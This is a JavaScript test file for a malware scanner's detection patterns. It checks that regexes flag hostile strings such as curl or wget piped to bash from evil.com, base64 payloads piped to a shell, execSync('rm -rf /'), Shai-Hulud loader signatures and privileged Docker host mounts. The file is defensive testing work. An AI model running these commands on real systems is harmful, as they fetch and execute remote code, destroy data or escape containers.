#!/usr/bin/env node
"use strict";
/**
 * Test Suite for CRITICAL_PATTERNS
 * Tests malware detection regex patterns against known malicious and benign content
 */

const { CRITICAL_PATTERNS } = require("../scan");

const colors = {
  green: "\x1b[32m",
  red: "\x1b[31m",
  cyan: "\x1b[36m",
  reset: "\x1b[0m",
};

let passed = 0;
let failed = 0;

function assert(condition, testName) {
  if (condition) {
    console.log(`${colors.green}✓${colors.reset} ${testName}`);
    passed++;
  } else {
    console.log(`${colors.red}✗${colors.reset} ${testName}`);
    failed++;
  }
}

function test(name, fn) {
  console.log(`\n${colors.cyan}${name}${colors.reset}`);
  fn();
}

function matchesPattern(content, indicator) {
  return CRITICAL_PATTERNS.some(
    (p) => p.indicator === indicator && p.pattern.test(content),
  );
}

function matchesAny(content) {
  return CRITICAL_PATTERNS.some((p) => p.pattern.test(content));
}

// --- REMOTE_CODE_EXEC patterns ---

test("REMOTE_CODE_EXEC: curl piped to shell", () => {
  assert(
    matchesPattern("curl https://evil.com/script.sh | bash", "REMOTE_CODE_EXEC"),
    "curl piped to bash detected",
  );
  assert(
    matchesPattern("curl https://evil.com/script.sh | sh", "REMOTE_CODE_EXEC"),
    "curl piped to sh detected",
  );
  assert(
    matchesPattern("wget https://evil.com/s.sh | bash", "REMOTE_CODE_EXEC"),
    "wget piped to bash detected",
  );
});

test("REMOTE_CODE_EXEC: curl download & exec", () => {
  assert(
    matchesPattern(
      "curl https://evil.com/bin>/tmp/x && bash /tmp/x",
      "REMOTE_CODE_EXEC",
    ),
    "curl save + bash pattern detected",
  );
});

test("REMOTE_CODE_EXEC: GitHub raw content piped to shell", () => {
  assert(
    matchesPattern(
      "curl https://raw.githubusercontent.com/user/repo/main/s.sh | bash",
      "REMOTE_CODE_EXEC",
    ),
    "curl githubusercontent piped to bash",
  );
});

test("REMOTE_CODE_EXEC: base64 decode to shell", () => {
  assert(
    matchesPattern("base64 -d payload | bash", "REMOTE_CODE_EXEC"),
    "base64 decode piped to bash",
  );
});

test("REMOTE_CODE_EXEC: subshell and backtick curl", () => {
  assert(
    matchesPattern("result=$(curl https://evil.com/cmd)", "REMOTE_CODE_EXEC"),
    "subshell curl detected",
  );
  assert(
    matchesPattern("result=`curl https://evil.com/cmd`", "REMOTE_CODE_EXEC"),
    "backtick curl detected",
  );
});

test("REMOTE_CODE_EXEC: bash -c curl", () => {
  assert(
    matchesPattern('bash -c "curl https://evil.com/payload"', "REMOTE_CODE_EXEC"),
    "bash -c curl pattern detected",
  );
});

test("REMOTE_CODE_EXEC: curl/wget save and exec", () => {
  assert(
    matchesPattern(
      "curl https://evil.com/bin-o /tmp/x && chmod +x /tmp/x",
      "REMOTE_CODE_EXEC",
    ),
    "curl -o + chmod detected",
  );
  assert(
    matchesPattern(
      "wget https://evil.com/bin-O /tmp/x && bash /tmp/x",
      "REMOTE_CODE_EXEC",
    ),
    "wget -O + bash detected",
  );
});

// --- OBFUSCATION patterns ---

test("OBFUSCATION: base64 decoding", () => {
  assert(
    matchesPattern("base64 --decode payload.txt", "OBFUSCATION"),
    "base64 --decode detected",
  );
  assert(
    matchesPattern("base64 -d encoded.txt", "OBFUSCATION"),
    "base64 -d detected",
  );
});

// --- CODE_INJECTION patterns ---

test("CODE_INJECTION: eval statement", () => {
  assert(
    matchesPattern("eval(someCode)", "CODE_INJECTION"),
    "eval() detected",
  );
});

test("CODE_INJECTION: child_process patterns", () => {
  assert(
    matchesPattern(
      'node -e "require(\'child_process\').execSync(\'whoami\')"',
      "CODE_INJECTION",
    ),
    "node -e child_process detected",
  );
  assert(
    matchesPattern(
      "require('child_process').exec('ls')",
      "CODE_INJECTION",
    ),
    "direct child_process.exec detected",
  );
  assert(
    matchesPattern("execSync('rm -rf /')", "CODE_INJECTION"),
    "execSync detected",
  );
  assert(
    matchesPattern("spawnSync('cmd')", "CODE_INJECTION"),
    "spawnSync detected",
  );
});

// --- SHAI_HULUD patterns ---

test("SHAI_HULUD: known loader and payload signatures", () => {
  assert(
    matchesPattern("setup_bun.js", "SHAI_HULUD"),
    "setup_bun signature detected",
  );
  assert(
    matchesPattern("bun_environment.json", "SHAI_HULUD"),
    "bun_environment signature detected",
  );
  assert(
    matchesPattern("SHA1HULUD_marker", "SHAI_HULUD"),
    "SHA1HULUD signature detected",
  );
});

// --- PERSISTENCE patterns ---

test("PERSISTENCE: GitHub workflow backdoor", () => {
  assert(
    matchesPattern(
      ".github/workflows/discussion.yml",
      "PERSISTENCE",
    ),
    "workflow discussion.yml detected",
  );
  assert(
    matchesPattern(
      ".github/workflows/discussion.yaml",
      "PERSISTENCE",
    ),
    "workflow discussion.yaml detected",
  );
});

// --- PRIV_ESC patterns ---

test("PRIV_ESC: Docker privilege escalation", () => {
  assert(
    matchesPattern("docker run --privileged evil-image", "PRIV_ESC"),
    "privileged docker run detected",
  );
  assert(
    matchesPattern("docker run -v /:/host evil", "PRIV_ESC"),
    "host mount in container detected",
  );
});

// --- Safe content should NOT match ---

test("Safe content should not trigger", () => {
  assert(
    !matchesAny("const express = require('express');"),
    "Normal require does not trigger",
  );
  assert(
    !matchesAny("console.log('Hello, world!');"),
    "Console.log does not trigger",
  );
  assert(
    !matchesAny("npm install --save lodash"),
    "npm install does not trigger",
  );
  assert(
    !matchesAny("const fs = require('fs');"),
    "fs require does not trigger",
  );
});

// Summary
console.log(`\n${colors.cyan}Test Results:${colors.reset}`);
console.log(`${colors.green}Passed: ${passed}${colors.reset}`);
if (failed > 0) {
  console.log(`${colors.red}Failed: ${failed}${colors.reset}`);
  process.exit(1);
} else {
  console.log(`${colors.green}All tests passed!${colors.reset}`);
  process.exit(0);
}
